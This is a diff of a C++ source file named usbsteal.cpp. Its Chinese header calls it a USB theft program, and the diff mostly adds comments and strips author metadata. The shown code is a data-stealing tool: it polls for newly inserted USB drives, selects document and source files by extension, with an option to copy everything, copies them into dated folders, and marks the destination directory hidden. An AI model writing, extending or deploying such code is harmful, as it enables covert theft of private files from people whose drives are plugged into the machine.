@@ -3,16 +3,7 @@
 * All rights reserved.
 *
 * 文件名称：usbsteal.cpp
-* 文件标识：见配置管理计划书
 * 摘    要：USB盗窃程序,生成线程监视并盗窃U盘内容
-*
-* 当前版本：1.0
-* 作    者：outmatch
-* 完成日期：2006年9月6日
-*
-* 取代版本：无
-* 原作者  ：
-* 完成日期：
 */
 
 #include "stdafx.h"
@@ -32,11 +23,13 @@ extern std::string getSystemPath();
 
 HRESULT   EnumDirectory(LPCTSTR   lpszDirectory,BOOL   bIncludeSubDirectory, std::vector<std::string>& vsFiles);
 
+/// 当前U盘盘符
 char g_szCurVol[MAX_PATH+1] = { 0 };
 
-// 间隔时间，毫秒
+/// 搜索U盘间隔时间，毫秒
 enum { INTERVAL = 1000 };
 
+/// 搜索新出现的U盘，找到后返回其盘符
 usbList searchforUSB()
 {
 	static usbList prevUsbList; 
@@ -85,6 +78,7 @@ usbList searchforUSB()
 	}
 }
 
+/// 复制文件的白名单，如果有*出现则无条件复制
 const char* g_szFileAcceptList[] = {
 	"doc",
 	"xls",
@@ -104,7 +98,7 @@ const char* g_szFileAcceptList[] = {
 	"hpp",
 	"c",
 	"h",
-//	"*",
+//	"*",	全部复制
 	0
 };
 
@@ -124,6 +118,7 @@ bool needCopy(const std::string &path)
 	return false;
 }
 
+/// 得到复制目的文件名，根据源文件名和目标路径
 std::string getOutputFilename(const std::string& sFilename, const std::string& sSrcDir, const std::string &sDstDir)
 {
 	size_t pos = sFilename.find(sSrcDir);
@@ -135,6 +130,7 @@ std::string getOutputFilename(const std::string& sFilename, const std::string& s
 	return sDstDir + sFilename.substr(pos);
 }
 
+/// 复制线程
 void copierThreadFunc(LPVOID *)
 {
 	// Search for USB device
@@ -184,7 +180,7 @@ void copierThreadFunc(LPVOID *)
 	_endthread();
 }
 
-// 过滤不能为目录名的\/:*?"<>|字符
+/// 过滤不能为目录名的\/:*?"<>|字符
 void filterBadChar(char *pszStr)
 {
 	static const char *szBadChar = "\\/:*?\"<>|"; 
@@ -198,7 +194,7 @@ void filterBadChar(char *pszStr)
 	}
 }
 
-// 生成输出目录名: 格式: 日期 - 时间 - 卷标名
+/// 生成输出目录名: 格式: 日期 - 时间 - 卷标名
 std::string getOutputDirname()
 {
 	char     m_Volume[256];//卷标名  
@@ -236,6 +232,7 @@ std::string getOutputDirname()
 	return buf;
 }
 
+/// 得到复制目标目录名
 std::string getDestDirName()
 {
 	std::string dir;
@@ -254,6 +251,7 @@ std::string getDestDirName()
 	return dir;
 }
 
+/// 将目录设为隐藏
 DWORD setDirHidden(const std::string &dir)
 {
 	DWORD stat = GetFileAttributes( dir.c_str());
